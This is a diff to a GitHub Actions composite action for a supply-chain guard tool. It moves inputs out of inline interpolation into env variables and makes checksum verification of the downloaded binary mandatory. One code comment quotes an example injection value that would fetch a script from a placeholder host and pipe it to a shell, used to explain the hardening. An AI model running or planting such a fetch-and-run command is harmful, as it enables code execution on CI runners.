@@ -8,7 +8,7 @@ branding:
 
 inputs:
   mode:
-    description: 'Operation mode: check (validate lockfile), scope (audit secrets for step), init (create lockfile)'
+    description: 'Operation mode: check (validate lockfile), scope (audit secrets for step), init (create lockfile), audit (full report)'
     required: true
   step-name:
     description: 'Step name for scope mode'
@@ -18,38 +18,61 @@ inputs:
     description: 'Path to scg.lock file'
     required: false
     default: 'scg.lock'
+  workflows:
+    description: 'Workflow directory to scan'
+    required: false
+    default: '.github/workflows'
   sanitize:
     description: 'In scope mode, actually remove forbidden secrets from environment'
-    required: false
-    default: 'false'
-  no-verify:
-    description: 'Skip signature verification (not recommended)'
     required: false
     default: 'false'
   json:
     description: 'Output results as JSON'
     required: false
     default: 'false'
-  version:
-    description: 'SCG version to install (default: latest)'
+  sarif:
+    description: >-
+      In check mode, write findings to this path as SARIF so they appear in the
+      repository's Security tab rather than only in the job log. Upload it with
+      github/codeql-action/upload-sarif.
     required: false
-    default: 'latest'
+    default: ''
+  version:
+    description: >-
+      SCG version to install, e.g. v0.1.32. Defaults to the version this action
+      was released with, so the action is itself pinned rather than pulling
+      whatever "latest" happens to be at the time it runs.
+    required: false
+    default: ''
 
 outputs:
   status:
-    description: 'Result status: ok, drift_detected, violations_found, error'
+    description: 'Result status: ok, drift_detected, violations_found, operational_failure'
   exit-code:
-    description: 'SCG exit code (0=clean, 1=issues)'
+    description: 'SCG exit code: 0=clean, 1=finding, 2=operational failure'
 
 runs:
   using: 'composite'
   steps:
     - name: Install SCG
       shell: bash
+      # Inputs reach the script through env, never through ${{ }} interpolation
+      # into the script body. Interpolated inputs are substituted before bash
+      # ever sees them, so a value like `; curl evil.sh | sh` from an issue
+      # title or a matrix entry becomes a command on the runner.
+      env:
+        SCG_VERSION: ${{ inputs.version }}
+        SCG_DEFAULT_VERSION: ${{ github.action_ref }}
       run: |
-        VERSION="${{ inputs.version }}"
-        if [ "$VERSION" = "latest" ]; then
-          VERSION=""
+        set -euo pipefail
+
+        VERSION="${SCG_VERSION:-}"
+        if [ -z "$VERSION" ]; then
+          VERSION="${SCG_DEFAULT_VERSION:-}"
+        fi
+        if [ -z "$VERSION" ] || [ "$VERSION" = "latest" ]; then
+          echo "::error::Refusing to install an unpinned SCG version. Set the 'version' input to a released tag (e.g. v0.1.32)."
+          exit 1
         fi
 
         OS=$(uname -s | tr '[:upper:]' '[:lower:]')
@@ -57,77 +80,125 @@ runs:
         case "$ARCH" in
           x86_64|amd64) ARCH="amd64" ;;
           aarch64|arm64) ARCH="arm64" ;;
+          *) echo "::error::Unsupported architecture: $ARCH"; exit 1 ;;
         esac
 
         BINARY="scg-${OS}-${ARCH}"
-        URL="https://scg.data-insights.ai/releases/${VERSION:-latest}/${BINARY}"
+        BASE="https://github.com/data-insights-ai/rho-scg/releases/download/${VERSION}"
+        TMP=$(mktemp -d)
+        trap 'rm -rf "$TMP"' EXIT
 
-        echo "::group::Install SCG"
-        curl -sSL -o /usr/local/bin/scg "$URL" || {
-          echo "::error::Failed to download SCG from $URL"
+        echo "::group::Install SCG ${VERSION}"
+
+        # Integrity verification is mandatory. A supply chain tool that installs
+        # itself from an unverified download is the exact failure it exists to
+        # prevent, so every branch below exits rather than continuing.
+        if ! curl -sSfL --retry 3 -o "$TMP/$BINARY" "$BASE/$BINARY"; then
+          echo "::error::Failed to download SCG from $BASE/$BINARY"
           exit 1
-        }
-        chmod +x /usr/local/bin/scg
+        fi
+        if ! curl -sSfL --retry 3 -o "$TMP/checksums.txt" "$BASE/checksums.txt"; then
+          echo "::error::Failed to download checksums.txt. Refusing to install an unverified binary."
+          exit 1
+        fi
+
+        EXPECTED=$(grep " ${BINARY}\$" "$TMP/checksums.txt" | awk '{print $1}' | head -1)
+        if [ -z "$EXPECTED" ]; then
+          echo "::error::No checksum published for ${BINARY}. Refusing to install."
+          exit 1
+        fi
+
+        if command -v sha256sum >/dev/null 2>&1; then
+          ACTUAL=$(sha256sum "$TMP/$BINARY" | awk '{print $1}')
+        elif command -v shasum >/dev/null 2>&1; then
+          ACTUAL=$(shasum -a 256 "$TMP/$BINARY" | awk '{print $1}')
+        else
+          echo "::error::Neither sha256sum nor shasum is available. Cannot verify the download."
+          exit 1
+        fi
+
+        if [ "$ACTUAL" != "$EXPECTED" ]; then
+          echo "::error::Checksum mismatch for ${BINARY}. Expected ${EXPECTED}, got ${ACTUAL}."
+          exit 1
+        fi
+        echo "Checksum verified: ${ACTUAL}"
+
+        install -m 0755 "$TMP/$BINARY" /usr/local/bin/scg
         scg version
         echo "::endgroup::"
 
     - name: Run SCG
       id: scg
       shell: bash
+      env:
+        SCG_MODE: ${{ inputs.mode }}
+        SCG_STEP_NAME: ${{ inputs.step-name }}
+        SCG_LOCKFILE: ${{ inputs.lockfile }}
+        SCG_WORKFLOWS: ${{ inputs.workflows }}
+        SCG_SANITIZE: ${{ inputs.sanitize }}
+        SCG_JSON: ${{ inputs.json }}
+        SCG_SARIF: ${{ inputs.sarif }}
       run: |
-        ARGS=""
-        MODE="${{ inputs.mode }}"
+        set -uo pipefail
 
-        case "$MODE" in
+        # Arguments are built as an array, so a value containing spaces or shell
+        # metacharacters stays a single argument instead of being re-split.
+        ARGS=()
+        case "$SCG_MODE" in
           check)
-            ARGS="check --lockfile ${{ inputs.lockfile }}"
-            if [ "${{ inputs.no-verify }}" = "true" ]; then
-              ARGS="$ARGS --no-verify"
-            fi
-            if [ "${{ inputs.json }}" = "true" ]; then
-              ARGS="$ARGS --json"
+            ARGS=(check --lockfile "$SCG_LOCKFILE")
+            if [ -n "$SCG_SARIF" ]; then
+              ARGS+=(--sarif "$SCG_SARIF")
             fi
             ;;
           scope)
-            if [ -z "${{ inputs.step-name }}" ]; then
+            if [ -z "$SCG_STEP_NAME" ]; then
               echo "::error::step-name is required for scope mode"
               exit 1
             fi
-            ARGS="scope --step ${{ inputs.step-name }}"
-            if [ "${{ inputs.sanitize }}" = "true" ]; then
-              ARGS="$ARGS --sanitize"
-            fi
-            if [ "${{ inputs.json }}" = "true" ]; then
-              ARGS="$ARGS --json"
+            ARGS=(scope --step "$SCG_STEP_NAME" --workflows "$SCG_WORKFLOWS")
+            if [ "$SCG_SANITIZE" = "true" ]; then
+              ARGS+=(--sanitize)
             fi
             ;;
           init)
-            ARGS="init --lockfile ${{ inputs.lockfile }}"
-            if [ "${{ inputs.json }}" = "true" ]; then
-              ARGS="$ARGS --json"
-            fi
+            ARGS=(init --lockfile "$SCG_LOCKFILE" --workflows "$SCG_WORKFLOWS")
             ;;
           audit)
-            ARGS="audit --lockfile ${{ inputs.lockfile }}"
-            if [ "${{ inputs.json }}" = "true" ]; then
-              ARGS="$ARGS --json"
-            fi
+            ARGS=(audit --lockfile "$SCG_LOCKFILE" --workflows "$SCG_WORKFLOWS")
             ;;
           *)
-            echo "::error::Unknown mode: $MODE (use check, scope, init, or audit)"
+            echo "::error::Unknown mode: $SCG_MODE (use check, scope, init, or audit)"
             exit 1
             ;;
         esac
 
-        echo "::group::SCG $MODE"
+        if [ "$SCG_JSON" = "true" ]; then
+          ARGS+=(--json)
+        fi
+
+        echo "::group::SCG $SCG_MODE"
         EXIT_CODE=0
-        scg $ARGS || EXIT_CODE=$?
+        scg "${ARGS[@]}" || EXIT_CODE=$?
         echo "::endgroup::"
 
         echo "exit-code=$EXIT_CODE" >> "$GITHUB_OUTPUT"
-        if [ "$EXIT_CODE" -eq 0 ]; then
-          echo "status=ok" >> "$GITHUB_OUTPUT"
-        else
-          echo "status=issues_found" >> "$GITHUB_OUTPUT"
-          exit $EXIT_CODE
-        fi
+
+        # Exit code 2 is an SCG operational failure — the platform was
+        # unreachable, rate limited, or its data was stale. It says nothing
+        # about the caller's dependencies, so it is surfaced as a warning
+        # annotation rather than an error that reads like a detection.
+        case "$EXIT_CODE" in
+          0)
+            echo "status=ok" >> "$GITHUB_OUTPUT"
+            ;;
+          2)
+            echo "status=operational_failure" >> "$GITHUB_OUTPUT"
+            echo "::warning::SCG could not complete the check (operational failure, not a finding). Nothing was detected about your dependencies."
+            exit 2
+            ;;
+          *)
+            echo "status=issues_found" >> "$GITHUB_OUTPUT"
+            exit "$EXIT_CODE"
+            ;;
+        esac
